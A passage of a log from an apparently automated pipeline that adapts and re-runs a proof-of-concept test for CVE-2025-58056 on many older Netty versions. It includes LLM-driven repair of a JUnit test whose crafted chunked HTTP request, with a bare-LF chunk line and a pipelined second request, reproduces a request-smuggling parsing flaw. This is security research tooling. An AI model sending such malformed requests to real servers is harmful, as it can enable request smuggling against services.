          <version>3.1.0</version>
        </plugin>
        <!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifactId>
          <version>3.0.0</version>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>

[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length |': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 43, 'column': 37, 'message': 'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        assertTrue(request.headers().contains("Transfer-Encoding", "chunked"));'}]}
[LLMClient] Tokens used: 183 (prompt), 4 (completion), 187 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.10.Final: 

Error: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 4.0.11.Final 

Error code:         assertTrue(request.headers().contains("Transfer-Encoding", "chunked")); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
HttpHeaders;contains
[96m[ErrorManager] Extracted key entities: ['HttpHeaders', 'contains'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 43, 'column': 37, 'message': 'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        assertTrue(request.headers().contains("Transfer-Encoding", "chunked"));'} with cause: ['HttpHeaders', 'contains'][0m
[LLMClient] Tokens used: 204 (prompt), 4 (completion), 208 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.10.Final: 

Error: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 4.0.11.Final 

Error code:         assertTrue(request.headers().contains("Transfer-Encoding", "chunked")); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['HttpHeaders', 'contains'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
HttpHeaders;contains
[96m[ErrorManager] Extracted key entities: ['HttpHeaders', 'contains'][0m
[96m[Adapter] Related diffs for error: [][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length | cause: ['HttpHeaders', 'contains'][0m
[96m[RepairModule] Trying best diff #None with score 0.00[0m
[96m[RepairModule] Found 0 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: No diff selected.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #None with score 0.00[0m
[93m[RepairModule] Diff #None content empty[0m
[LLMClient] Tokens used: 712 (prompt), 465 (completion), 1177 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 4.0.10.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully in 4.0.11.Final.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 4.0.11.Final to 4.0.10.Final.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked"));

### Related Diff:


### Test File Content:
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked"));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}



[LLMClient] Response: 
```java
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding") && "chunked".equals(request.headers().get("Transfer-Encoding")));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.10.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success![0m
[92m[RepairModule] Repair success with diff #None at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.10.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 4.0.11.Final to 4.0.10.Final successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 4.0.10.Final...[0m
[92m[Executor] Adaptation + reproduction successful on 4.0.10.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.10.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.9.Final[0m
[96m[Selector] Closest reproduced version: 4.0.10.Final at index 30[0m
[96m[Adapter] Trying next closest version: 4.0.9.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.10.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.9.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.9.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.9.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.9.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.9.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.9.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.9.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.9.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.9.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.8.Final[0m
[96m[Selector] Closest reproduced version: 4.0.9.Final at index 29[0m
[96m[Adapter] Trying next closest version: 4.0.8.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.9.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.8.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.8.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.8.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.8.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.8.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.8.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.8.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.8.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.8.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.7.Final[0m
[96m[Selector] Closest reproduced version: 4.0.8.Final at index 28[0m
[96m[Adapter] Trying next closest version: 4.0.7.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.8.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.7.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.7.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.7.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.7.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.7.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.7.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.7.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.7.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.7.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.6.Final[0m
[96m[Selector] Closest reproduced version: 4.0.7.Final at index 27[0m
[96m[Adapter] Trying next closest version: 4.0.6.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.7.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.6.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.6.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.6.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.6.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.6.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.6.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.6.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.6.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.6.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.5.Final[0m
[96m[Selector] Closest reproduced version: 4.0.6.Final at index 26[0m
[96m[Adapter] Trying next closest version: 4.0.5.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.6.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.5.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.5.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.5.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.5.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.5.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.5.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.5.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.5.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.5.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.4.Final[0m
[96m[Selector] Closest reproduced version: 4.0.5.Final at index 25[0m
[96m[Adapter] Trying next closest version: 4.0.4.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.5.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.4.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.4.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.4.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.4.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.4.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.4.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.4.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.4.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.4.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.3.Final[0m
[96m[Selector] Closest reproduced version: 4.0.4.Final at index 24[0m
[96m[Adapter] Trying next closest version: 4.0.3.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.4.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.3.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.3.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.3.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.3.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.3.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.3.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.3.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.3.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.3.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.2.Final[0m
[96m[Selector] Closest reproduced version: 4.0.3.Final at index 23[0m
[96m[Adapter] Trying next closest version: 4.0.2.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.3.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.2.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.2.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.2.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.2.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.2.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.2.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.2.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.2.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.2.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.1.Final[0m
[96m[Selector] Closest reproduced version: 4.0.2.Final at index 22[0m
[96m[Adapter] Trying next closest version: 4.0.1.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.2.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.1.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.1.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.1.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.1.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.1.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.1.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.1.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.1.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.1.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.Final[0m
[96m[Selector] Closest reproduced version: 4.0.1.Final at index 21[0m
[96m[Adapter] Trying next closest version: 4.0.0.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.1.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR9[0m
[96m[Selector] Closest reproduced version: 4.0.0.Final at index 20[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR9[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR9/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR9 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR9/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR9 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR9/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR9...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR9...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR9[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR9[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR8[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR9 at index 19[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR8[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR9/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR8/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR8 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR8/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR8 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR8/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR8...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR8...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR8[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR8[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR7[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR8 at index 18[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR7[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR8/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR7/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR7 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR7/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR7 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR7/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR7...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR7...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR7[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR7[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR6[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR7 at index 17[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR6[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR7/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR6/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR6 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR6/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR6 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR6/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR6...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR6...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR6[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR6[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR5[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR6 at index 16[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR5[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR6/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR5/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR5 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR5/exploit/pom.xml[0m
